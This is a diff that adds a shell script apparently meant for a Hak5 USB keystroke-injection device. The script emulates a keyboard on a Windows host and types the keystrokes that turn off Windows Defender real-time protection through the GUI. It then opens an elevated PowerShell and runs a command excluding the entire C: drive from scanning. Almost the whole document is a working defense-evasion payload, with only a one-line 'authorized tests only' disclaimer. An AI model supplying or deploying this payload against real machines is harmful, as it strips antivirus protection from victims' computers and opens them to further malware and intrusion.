@@ -1,0 +1,33 @@
+#!/bin/bash
+# hak5_defeat_defender (Windows host, HID) — disables Windows Defender
+# real-time protection via the GUI + adds C:\ exclusion via PowerShell.
+# Authorized tests only.
+LED SETUP
+ATTACKMODE HID
+sleep 3
+LED STAGE1
+if [ ! -c /dev/hidg0 ]; then
+    echo "[!] /dev/hidg0 missing - no host attached"
+    LED R SINGLE; sleep 1; LED OFF; LED FINISH; exit 1
+fi
+QUACK "REM hak5_defeat_defender — authorized tests only" \
+    "DELAY 2000" \
+    "CTRL ESC" "DELAY 750" \
+    "STRING windows security" "DELAY 250" \
+    "ENTER" "DELAY 1000" "ENTER" "DELAY 500" \
+    "TAB" "DELAY 100" \
+    "TAB" "DELAY 100" \
+    "TAB" "DELAY 100" \
+    "TAB" "DELAY 100" \
+    "ENTER" "DELAY 500" \
+    "SPACE" "DELAY 1000" \
+    "ALT y" "DELAY 1000" \
+    "ALT F4" "DELAY 500" \
+    "GUI r" "DELAY 500" \
+    "STRING powershell" "CTRL-SHIFT ENTER" "DELAY 1000" \
+    "ALT y" "DELAY 1000" \
+    "STRING Add-MpPreference -ExclusionPath \"C:\"" "ENTER" "DELAY 2000" \
+    "STRING EXIT" "ENTER"
+echo "[+] defeat_defender injected — Defender off + C: excluded"
+LED FINISH
+exit 0
